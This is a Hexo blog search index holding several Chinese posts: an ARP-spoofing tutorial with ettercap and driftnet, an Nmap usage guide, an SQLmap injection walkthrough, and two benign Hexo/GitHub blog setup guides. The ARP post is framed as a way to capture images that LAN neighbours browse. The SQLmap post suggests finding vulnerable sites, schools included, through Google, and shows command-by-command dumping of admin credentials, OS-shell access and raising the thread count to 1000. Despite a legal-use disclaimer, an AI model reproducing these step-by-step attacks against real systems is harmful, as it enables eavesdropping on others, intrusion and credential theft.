<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ARP欺骗，可获取区域网小伙伴的相册哦！！！]]></title>
    <url>%2F2018%2F07%2F23%2FARP%E6%AC%BA%E9%AA%97%EF%BC%8C%E5%8F%AF%E8%8E%B7%E5%8F%96%E5%8C%BA%E5%9F%9F%E7%BD%91%E5%B0%8F%E4%BC%99%E4%BC%B4%E7%9A%84%E7%9B%B8%E5%86%8C%E5%93%A6%EF%BC%81%EF%BC%81%EF%BC%81%2F</url>
    <content type="text"><![CDATA[运行平台：ubuntu 需要软件：ettercap、driftnet 互联网发展速度飞快，给我们带来的便捷，也给我们留下了危险。在很多报道中都有关于用户信息丢失，数据被窃听等新闻，那这些是如何实现的呢，以此文章给大家一些提示，知道如何攻击，才能更好的做好防范。何为嗅探: 通俗的说就是窃听局域网的数据包，专业一点就是arp攻击。 arp攻击原理： 第一步：分别安装ettercap、driftnet 在ubuntu终端窗口输入如下： 12sudo apt-get install ettercap-common sudo apt-get install driftnet 第二步：ettercap软件的使用 ubuntu终端窗口输入如下： 1sudo ettercap -G 启动之后如下界面： 选择要监听的网卡: 点击Sniff====&gt;Unified sniffing 然后选择监听网卡 列出当前局域网上所有主机 点击Hosts====&gt;Scan for hosts====&gt;Hosts list 选定目标主机，然后点add to target 1,将目标主机添加到目标1;选定路由，点add to target 2,将路由添加到目标 然后点mitm===&gt;arp posoning ，勾选sniff remote connections： 点击Start====&gt;Startsniffing,开始监听 打开终端输入命令： 1sudo driftnet -i wlp3s0 ` 这里的wlp3s0 写自己的网卡名称 接下来出现一个黑乎乎的窗口，只要对方浏览了一下图片之类的就能嗅探到了]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透工具之Nmap使用]]></title>
    <url>%2F2018%2F07%2F22%2F%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BNmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[本篇是介绍端口扫描工具Nmap的使用方法。Nmap在渗透测试中经常用到，它不仅可以用来确定目标网络上计算机的存活状态，而且可以扫描各个计算机的操作系统、开放端口、服务，还有可能获得用户的证书。熟练掌握 Nmap 的用法，可以极大的提高渗透测试技术。 Nmap的安装Window：可以去官网找到相对应的版本进行下载 Ubuntu：1sudo apt-get install nmap Nmap的命令格式1nmap -[option][IP or domain] -oN [fileName.txt] 想全面了解可以与nmap结合使用的所有参数，请使用“nmap –help”命令。 常用参数说明TCP 扫描端口扫描中最稳定的，利用的是TCP三次握手。TCP扫描通常用于收集有关目标的更多信息，但是会和目标主机建立一个完成的 TCP 连接。1nmap -sT -Pn 127.0.0.1 //-sT TCP 连接扫描（s ==&gt; 哪种类型扫描；T ==&gt; TCP 类型） SYN 扫描TCP 两次握手（隐藏扫描，速度快，nmap 缺省参数）1nmap -sS -Pn 127.0.0.1 用主机名和IP地址扫描系统1nmap 127.0.0.1`或者`nmap www.xxxx.com 扫描使用“-v”选项使用“ -v “选项后给出了远程机器更详细的信息。1nmap -v 127.0.0.1 扫描多台主机你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。1nmap -v 127.0.0.1 127.0.0.2 127.0.0.3 扫描整个子网你可以使用*通配符来扫描整个子网或某个范围的IP地址1nmap -v 127.0.0.* 使用IP地址的最后一个字节扫描多台服务器你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。1nmap -v 127.0.0.1,2,3 从一个文件中扫描主机列表如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。创建一个名为“nmaptest.txt”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。接下来运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址1nmap -iL nmaptest.txt 扫描操作系统信息和路由跟踪使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“-A“选项。1nmap -A 127.0.0.1 启用Nmap的操作系统探测功能1nmap -O 127.0.0.1 扫描主机侦测防火墙下面的命令将扫描远程主机以探测该主机是否使用了包过滤器或防火墙。1nmap -sA 127.0.0.1 扫描主机检测是否有防火墙保护扫描主机检测其是否受到数据包过滤软件或防火墙的保护。1nmap -PN 192.168.0.101 找出网络中的在线主机使用“-sP”选项，我们可以简单的检测网络中有哪些在线主机，该选项会跳过端口扫描和其他一些检测。1nmap -sP 127.0.0.* 顺序扫描端口使用“-r”选项表示不会随机的选择端口扫描。1nmap -r 127.0.0.1 扫描特定的端口1nmap -p 80 127.0.0.1 扫描多个端口你还可以使用选项“-P”来扫描多个端口。1nmap -p 80,443 127.0.0.1 扫描指定范围内的端口您可以使用表达式来扫描某个范围内的端口。1nmap -p 80-160 127.0.0.1 查看Nmap的版本1nmap -V 常用的命令大概有这么几个，当然不是全部，更多的命令选项可以去官网那里有详细的介绍。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次SQLmap注入实战]]></title>
    <url>%2F2018%2F07%2F21%2F%E8%AE%B0%E4%B8%80%E6%AC%A1SQLmap%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[简介 Sqlmap是一种开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令. 安装 $ git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev 基本使用方法:GET:1234567891011$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; // 测试该注入点是否能够进行注入$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --dbs // 对注入点进行注入,并导出数据库名$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database --tables // 对database这个数据库进行表的猜测$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin --columns // 对database下的admin表中字段进行猜测$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; -D database -T admin -C user,password --dump// 对database下的admin表中user和password字段进行猜测并dump POST:123456789101112131415161718192021222324252627282930313233$ python sqlmap.py -r header.txt$ python sqlmap.py -r header.txt --dbs...// -r是从一个文件中载入HTTP请求// 其余都与GET一样将-u部分改成-r// header.txtPOST /index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/index.phpConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 18id=1 Cookie:12345$ python sqlmap.py -u &quot;http://127.0.0.1/index.php&quot; --cookie=&quot;id=1&quot; --level=2...// 其余与GET一样,别忘记加上--cookie参数 其他:1234567$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-shell // 获取远程主机的shell$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --os-cmd=&quot;whoami&quot; // 执行远程主机的命令$ python sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; --is-dba // 检查DBMS用户是否为DBA$ python sqlmap.py -g &quot;inurl:php?id=&quot; // 通过google寻找url带有php?id=字段的地址 实战开始找到潜在的攻击目标第一步是找到有SQL注入漏洞的网站。如果你没有特定攻击目标，可以使用Google搜索 php?id=1 （或php?id= ＋ 学校）： 找到目标 http://test.net/about.php?id=12 //这里我就用test代替网址了 检测是否有SQL注入漏洞；在url后添加一个单符号（’），使用浏览器访问 http://test.net/about.php?id=12 ‘ //如果网站没有SQL注入漏洞，使用上面的地址访问不会有问题。如果有SQL注入漏洞，会有错误输出： 加上 and 1=1 和 and 1=2 ,一个正常显示，一个报错，可以确定存在注入漏洞了。 下面来对注入点进行注入,并导出数据库名： 1$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; --dbs 自动探测数据库类型和漏洞，如果成功会列出数据库： 从这几个表的名称可以猜测出来，应该是这个xcdy表： 1$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy --tables 接下来获取表的字段： 1$ python2 sqlmap.py -u &quot;http://test.net/about.php?id=12&quot; -D xcdy -T t_admin --columns 对 xcdy 下的t_admin表中username和pwd字段进行猜测并dump: 1python sqlmap.py -u &quot;hhttp://test.net/about.php?id=12&quot; -D xcdy -T t_admin -C user,password --dump 好了，账号和密码都出来了。 这次实战主要是为了对SQLmap加深理解。 小技巧大家基本上都会遇到，sqlmap注入很慢，这是因为sqlmap默认的最大线程是10.下面给出sqlmap修改最大线程数的方法;前提是:你的目标站服务器能抗住就行。 修改方法找到settings.py文件,具体在\lib\core\目录下 找到 12# Maximum number of threads (avoiding connection issues and/or DoS)MAX_NUMBER_OF_THREADS = 10 修改为MAX_NUMBER_OF_THREADS = 1000 本文中提及的技术只适用于合法的渗透测试，请勿用于其他的非法用途，如用作其他非法用途于本文作者无关。]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>SQLmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO主题NEXT配置]]></title>
    <url>%2F2018%2F02%2F22%2FHEXO%E4%B8%BB%E9%A2%98NEXT%E9%85%8D%E7%BD%AE%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>HEXO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO搭建GitHub博客（一）]]></title>
    <url>%2F2018%2F02%2F20%2FHEXO%E6%90%AD%E5%BB%BAGitHub%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[现在越来越多的人喜欢利用Github搭建静态网站，原因不外乎简单省钱。本人也利用hexo+github搭建了本博客，用于分享一些心得。在此过程中，折腾博客的各种配置以及功能占具了我一部分时间，在此详细记录下我是如何利用hexo+github搭建静态博客以及一些配置相关问题，以免过后遗忘，且当备份之用。因本人使用的是Linux，所以本教程以Ubuntu为参考，其实Ubuntu与windows搭建github博客相差无几，如果有用windows的小伙伴感到不适，可以参考手把手教你建github技术博客教程。 前期工作 注册GitHub （官网进行注册）。 下载node.js并安装（官网下载安装），默认会安装npm。 下载安装git（Linux默认安装git，如果没有请到官网下载安装）。 下载安装hexo。 本地搭建hexo静态博客// 建立一个博客文件夹，并初始化博客，&lt;folder&gt;为文件夹的名称，可以随便起名字 $ hexo init &lt;folder&gt; // 进入博客文件夹，&lt;folder&gt;为文件夹的名称 $ cd &lt;folder&gt; // node.js的命令，根据博客既定的dependencies配置安装所有的依赖包 $ npm install HEXO常用命令 hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章 hexo clean #清除缓存 网页正常情况下可以忽略此条命令 hexo s == hexo server #启动服务预览 hexo g == hexo generate#生成 hexo d == hexo deploy#部署 hexo d -g == hexo deploy + hexo generate 将博客与GitHub关联 在Github上创建名字为XXX.github.io的项目，XXX为自己的github用户名。 打开本地的MyBlog文件夹项目内的_config.yml配置文件，将其中的type设置为git 1234deploy: type: git repository: https://github.com/XXXXXX/XXXXXX.github.io.git branch: master 运行：npm install hexo-deployer-git –save 运行：hexo g（本地生成静态文件） 运行：hexo d（将本地静态文件推送至Github） 绑定域名博客已经搭建好，也能通过github的域名访问，但总归还是用自己的域名比较舒服。因为我们需要设置将自己的域名绑定到github这个博客项目上。 域名提供商设置 添加2条A记录： @—&gt;192.30.252.154 @—&gt;192.30.252.153 添加一条CNAME记录： CNAME—&gt;XXXXXX.github.io 博客添加CNAME文件 配置完域名解析后，进入博客目录，在source目录下新建CNAME文件，写入域名，如：iyi.me (这里我们需要注意的是：CNAME文件添加的目录是在根目录下的source文件夹，而不是.deploy_git文件夹，完成添加后重新部署，博客网站又会恢复正常。) hexo g hexo d 更新博客内容​ 至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。 更新文章 在MyBlog目录下执行：hexo new “我的第一篇文章”，会在source-&gt;_posts文件夹内生成一个.md文件。 编辑该文件（遵循Markdown规则） 修改起始字段 title 文章的标题 date 创建日期 （文件的创建日期 ） updated 修改日期 （ 文件的修改日期） comments 是否开启评论 true tags 标签 categories 分类 permalink url中的名字（文件名） 编写正文内容（MakeDown） 保存后，我们进行本地发布： 1hexo s 打开浏览器，输入： 1http://localhost:4000/ 我们可以在浏览器端看到我们搭建好的博客和发布的文章了。 文章内插入图片在文章中写入 1![](/upload_image/1.jpg) ​ 然后进入themes-主题名-source-upload_image目录下(自己创建)，将图片放到这个目录下，就可以了。 说明：当执行hexo g命令时，会自动把图片复制到 public文件的upload_image目录下。]]></content>
      <categories>
        <category>技术杂谈</category>
      </categories>
      <tags>
        <tag>HEXO</tag>
      </tags>
  </entry>
</search>
